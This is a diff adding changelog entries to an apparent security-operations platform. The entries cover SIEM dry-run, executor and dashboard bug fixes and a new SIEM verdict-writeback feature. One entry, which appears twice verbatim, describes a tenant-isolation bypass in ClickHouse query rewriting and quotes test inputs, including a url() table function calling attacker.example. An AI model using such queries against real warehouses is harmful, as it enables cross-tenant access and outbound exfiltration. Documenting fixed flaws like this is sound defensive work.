@@ -95,6 +95,136 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Fixed
 
+- **A dry run called the customer's production SIEM.** The live-action dry-run
+  path works by stripping credentials so the executor falls through to
+  simulation, and the strip list did not match what the client factory reads:
+  the Splunk adapters stripped `splunk_host` / `splunk_token` / `splunk_index`
+  while `_splunk_client` reads `splunk_url` *first* and also accepts basic
+  auth. `splunk_url` is exactly what the credential resolver writes for a
+  connector-configured tenant, so a "preview" built a real client and called
+  Splunk. Elastic had the identical mismatch (`elastic_host` stripped,
+  `elastic_url` read). The strip lists are now the factories' own exported key
+  tuples, and a test re-derives each read set from the factory source so the
+  two cannot drift again.
+
+- **An `alert_vendor` pin was honoured without checking that vendor's
+  credentials existed.** `_ack_vendor` returned the pinned vendor
+  unconditionally. A dry run strips credentials, so the pin survived the strip,
+  resolved to "splunk" with no client, and hit an `assert` — crashing an action
+  that was meant to be a harmless preview. A pin naming a vendor the tenant had
+  never configured reported a vendor arm that could not run. A pin is now
+  checked against the credentials, and an unusable pin resolves to *nothing*
+  rather than falling through to whichever other SIEM happens to be configured:
+  "write this to Splunk" must not become "write this to Elastic".
+
+- **`CreateNotableEventExecutor` raised `TypeError` on every live call.** It
+  passed `title=` / `description=` / `fields=` to a client whose signature is
+  `(rule_name, event_data, severity, owner, status)`. Invisible because
+  simulation mode never constructs the client — the same defect class as the
+  `max_results` / `max_count` drift fixed earlier on this module. Every SIEM
+  executor-to-client call is now pinned by an autospec'd signature test, which
+  a hand-written fake with `**kwargs` could never have caught.
+
+- **The lake's tenant isolation could be switched off by resolving a
+  dependency one major version higher.** `lake_sql.rewrite_for_tenant` is the
+  only thing separating one tenant's events from another's in ClickHouse: it
+  parses untrusted operator SQL with sqlglot, enforces the table allowlist
+  against the parse tree, bans ClickHouse table functions, and injects the
+  `tenant_id` predicate. sqlglot 27 moved the SELECT's FROM clause from
+  `args["from"]` to `args["from_"]`. The table walk read the old key, got
+  nothing, and took the branch written for `SELECT 1` — "no FROM, so no tenant
+  data, nothing to do". Every single-table query then came back with no
+  allowlist check, no table-function ban and no tenant predicate, reported as
+  a successful rewrite.
+
+  `services/api/pyproject.toml` declared `sqlglot >=23.0.0,<31.0.0` while the
+  Dockerfile and every CI workflow declared `>=23,<27`, so this was reachable
+  by installing the service exactly as declared, and CI could not see it
+  because CI installed the narrow range. Verified on sqlglot 30.19.0 against
+  the pre-fix rewriter: `SELECT user_name FROM aisoc.raw_events` returned
+  unscoped, `SELECT * FROM system.tables` was accepted, and
+  `url('https://attacker.example/x', JSONEachRow)` was accepted — the last of
+  which makes the warehouse issue outbound HTTP with its own network identity.
+
+  Three changes rather than one, because pinning alone would leave the trap
+  armed for the next bump. The FROM clause now resolves by node type instead
+  of by key name. `rewrite_for_tenant` ends with an audit that takes its own
+  independent census of the statement's tables and raises the new
+  `LakeSqlIsolationError` unless every one of them was scoped, the tenant
+  survived into the rendered string, and every rendered SELECT that reads a
+  lake table carries the tenant in its own WHERE — so a partially scoped
+  UNION fails too. And all seven install paths now declare one identical
+  range, enforced by `scripts/check_sqlglot_pin.py`, with
+  `.github/workflows/lake-isolation.yml` running the rewriter suites against
+  both the shipped range and the next major so a future bump fails loudly
+  instead of quietly downgrading isolation.
+
+- **The alerts list was empty on every deployment, under a row count that was
+  real.** `AlertListResponse` returns the rows under `items`; the web client
+  read `raw.alerts`, which is never present, so `Array.isArray(undefined)` was
+  false and each page resolved to `[]` while `total` carried the true figure.
+  The queue therefore rendered "1,247 alerts" above an empty table with no
+  error to explain it, and an operator's most reasonable reading of that screen
+  was that their estate was quiet. The client now reads `items`, still accepts
+  the legacy `alerts` key the responder routes emit, and a test asserts the two
+  halves of the contract against each other so they cannot drift apart again.
+
+- **Two dashboards published fabricated security data as tenant state.**
+  `DashboardView` and `SOCMetricsDashboard` both wrapped their SWR
+  `fallbackData` in `demoFallback()`, which is `undefined` outside the hosted
+  demo — and both then defeated that gate a few lines later with an
+  unconditional `const resolved = isValid ? data : MOCK`. The mock was
+  therefore exactly what rendered during first paint and after any API error,
+  which for a self-hoster with an empty or unreachable backend is the whole
+  session.
+
+  What that put on screen as the reader's own numbers: a connector inventory
+  they do not run (`CrowdStrike EDR`, 412 events), a MITRE tactic ranking, a
+  24-hour alert-volume curve, MTTD 1.4h / MTTR 6.2h, and an LLM spend line of
+  $76.65 naming three models they had never configured. Three "vs yesterday"
+  trend deltas sat beside the real alert counts as literals — `/metrics/dashboard`
+  publishes no period-over-period comparison, so there was nothing to derive
+  them from.
+
+  Every panel now renders one of three honest states: real figures, an empty
+  state naming what would populate it, or an error state carrying the failure
+  and a retry that re-issues the request. Sample data still populates the
+  hosted demo, which is the only reason it exists.
+
+- **The lake's tenant isolation could be switched off by resolving a
+  dependency one major version higher.** `lake_sql.rewrite_for_tenant` is the
+  only thing separating one tenant's events from another's in ClickHouse: it
+  parses untrusted operator SQL with sqlglot, enforces the table allowlist
+  against the parse tree, bans ClickHouse table functions, and injects the
+  `tenant_id` predicate. sqlglot 27 moved the SELECT's FROM clause from
+  `args["from"]` to `args["from_"]`. The table walk read the old key, got
+  nothing, and took the branch written for `SELECT 1` — "no FROM, so no tenant
+  data, nothing to do". Every single-table query then came back with no
+  allowlist check, no table-function ban and no tenant predicate, reported as
+  a successful rewrite.
+
+  `services/api/pyproject.toml` declared `sqlglot >=23.0.0,<31.0.0` while the
+  Dockerfile and every CI workflow declared `>=23,<27`, so this was reachable
+  by installing the service exactly as declared, and CI could not see it
+  because CI installed the narrow range. Verified on sqlglot 30.19.0 against
+  the pre-fix rewriter: `SELECT user_name FROM aisoc.raw_events` returned
+  unscoped, `SELECT * FROM system.tables` was accepted, and
+  `url('https://attacker.example/x', JSONEachRow)` was accepted — the last of
+  which makes the warehouse issue outbound HTTP with its own network identity.
+
+  Three changes rather than one, because pinning alone would leave the trap
+  armed for the next bump. The FROM clause now resolves by node type instead
+  of by key name. `rewrite_for_tenant` ends with an audit that takes its own
+  independent census of the statement's tables and raises the new
+  `LakeSqlIsolationError` unless every one of them was scoped, the tenant
+  survived into the rendered string, and every rendered SELECT that reads a
+  lake table carries the tenant in its own WHERE — so a partially scoped
+  UNION fails too. And all seven install paths now declare one identical
+  range, enforced by `scripts/check_sqlglot_pin.py`, with
+  `.github/workflows/lake-isolation.yml` running the rewriter suites against
+  both the shipped range and the next major so a future bump fails loudly
+  instead of quietly downgrading isolation.
+
 - **The alerts list was empty on every deployment, under a row count that was
   real.** `AlertListResponse` returns the rows under `items`; the web client
   read `raw.alerts`, which is never present, so `Array.isArray(undefined)` was
@@ -195,6 +325,55 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   vault-encrypted connector rather than in a request body.
 
 ### Added
+
+- **Two-way SIEM integration: an AiSOC verdict is written back onto the
+  finding that produced the alert.** The integration only ever ran inbound. A
+  Splunk notable became an alert, the agent triaged it, and the notable sat in
+  the Splunk queue untouched — so an analyst re-read a finding AiSOC had
+  already dismissed, and a finding AiSOC had confirmed waited its turn behind
+  them. Nothing on `main` wrote a disposition back to any SIEM in any form.
+
+  New capability `update_alert_disposition` with five vendor arms (Splunk ES,
+  Elastic Security, Microsoft Sentinel, IBM QRadar, Microsoft Defender), two
+  new clients (`sentinel_client.py`, `qradar_client.py`), migration
+  `057_alert_source_links.sql`, and `POST /api/v1/alerts/{id}/source-writeback`.
+  The agents triage worker posts to that route after the verdict is durable and
+  fails soft — the verdict outranks its writeback, and an unreachable Splunk
+  must not dead-letter an alert that was triaged correctly. Docs:
+  [Integrations → SIEM writeback](apps/docs/docs/integrations/siem-writeback.md).
+
+  **The disposition mapping is the safety argument, not the approval tier.** A
+  confirmed true positive is *escalated and never closed*: it is the finding a
+  human most needs to see, and closing it because the platform is confident is
+  how an agent turns a real intrusion into a resolved ticket nobody read. An
+  unknown verdict is *refused, never guessed* — which matters because
+  `normalize_disposition` defaults an unrecognised string to `true_positive`,
+  so a mapper that normalised first would convert "I do not recognise this"
+  into a confident claim. Only benign and false-positive verdicts may close a
+  finding, and `benign_true_positive` is classified as a correct detection of
+  authorised activity rather than as a false positive, so it never inflates a
+  rule's own FP rate.
+
+  **Governance ships dry-run by default.** `AISOC_SIEM_WRITEBACK_ENABLED`
+  defaults on and `AISOC_SIEM_WRITEBACK_EXECUTE` defaults **off**, so an
+  operator opts in to writing into their own SIEM. Anything that is not an
+  explicit yes — including a typo — is read as a dry run. `executed` is the
+  single field that means a vendor was touched; it is carried on the API
+  response, on the worker's return value, and as a no-default column on
+  `alert_source_links`, so a dry run, a refusal and a credential-less
+  simulation can never be read as a write that happened. Projecting a closing
+  verdict onto a linked Jira / ServiceNow ticket needs a third flag
+  (`AISOC_SIEM_WRITEBACK_CLOSE_CASE`, off) because the ITSM connectors project
+  a status transition rather than a note, so the only truthful way to reach the
+  ticket is to resolve the case for real.
+
+- **The join key survives ingest.** `finding.uid` — the vendor's own id for a
+  finding — reached the OCSF envelope and was then discarded, so by the time a
+  row hit `alerts` the notable's rule UID, the Elastic signal id and the QRadar
+  offense id were gone and no verdict could be aimed at anything. Fusion now
+  carries it onto `alerts.external_id` and writes an `alert_source_links` row,
+  but only for a vendor with a writeback arm: a link to a system AiSOC cannot
+  write to would read as a two-way integration that is not one.
 
 - **A SOC operations dashboard at `/dashboards/operations`.** `/dashboard`
   answers what is happening in the estate; this answers whether the machine
